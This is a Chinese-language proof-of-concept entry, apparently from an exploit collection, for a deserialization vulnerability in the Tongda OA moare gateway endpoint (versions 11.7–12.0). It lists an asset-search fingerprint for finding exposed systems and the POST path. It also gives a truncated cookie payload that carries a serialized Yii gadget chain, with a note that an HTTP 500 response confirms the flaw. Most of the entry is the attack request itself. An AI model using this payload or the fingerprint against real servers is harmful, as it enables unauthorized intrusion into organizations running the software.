# 通达OAmoare存在反序列化漏洞

- **系统**：通达OA　|　**类型**：反序列化　|　**CVE**：—
- **指纹**：`app.name="通达 OA"`
- **请求**：`POST /general/appbuilder/web/portal/gateway/moare?a=1 HTTP/1.1`
- **关键头**：`Host: 192.168.31.164`　`Cookie: _GET=788eb9a7d83e5907306c64ea191f2e75d2222b9d0e78fba237a01653585a575bO%3A23%3A%2…`　`Content-Type: application/x-www-form-urlencoded`

**请求体 / payload**
```
**POC1**\
**通达OA11.7-通达OA12.0**\
当响应码为500表示存在漏洞
Host: xx.xx.xx.xx
Cookie: _COOKIE=8a987cdbe51b7fe8c0efaf47430b18b96a1477de4a08291eef0f7164bd1b5a9cO%3A23%3A%22yii%5Cdb%5CBatchQueryResult%22%3A1%3A%7Bs%3A36%3A%22%00yii%5Cdb%5CBatchQueryResult%00_dataReader%22%3BO%3A17%3A%22yii%5Cdb%5CDataReader%22%3A1%3A%7Bs%3A29%3A%22%00yii%5Cdb%5CDataReader%00_statement%22%3BO%3A20%3A%22yii%5Credis%5CConnection%22%3A8%3A%7Bs%3A32%3A%22%00yii%5Credis%5CConnection%00unixSocket%22%3Bi%3A0%3Bs%3A8%3A%22hostname%22%3Bs%3A13%3A%22www.baidu.com%22%3Bs%3A4%3A%22port%22%3Bs%3A3%3A%22443%22%3Bs%3A17%3A%22connectionTimeo…（脚本共 2856 字，完整版见原文）
```

**其他**
- 通达OA moare存在反序列化漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 通达OA11.7- 通达OA12.0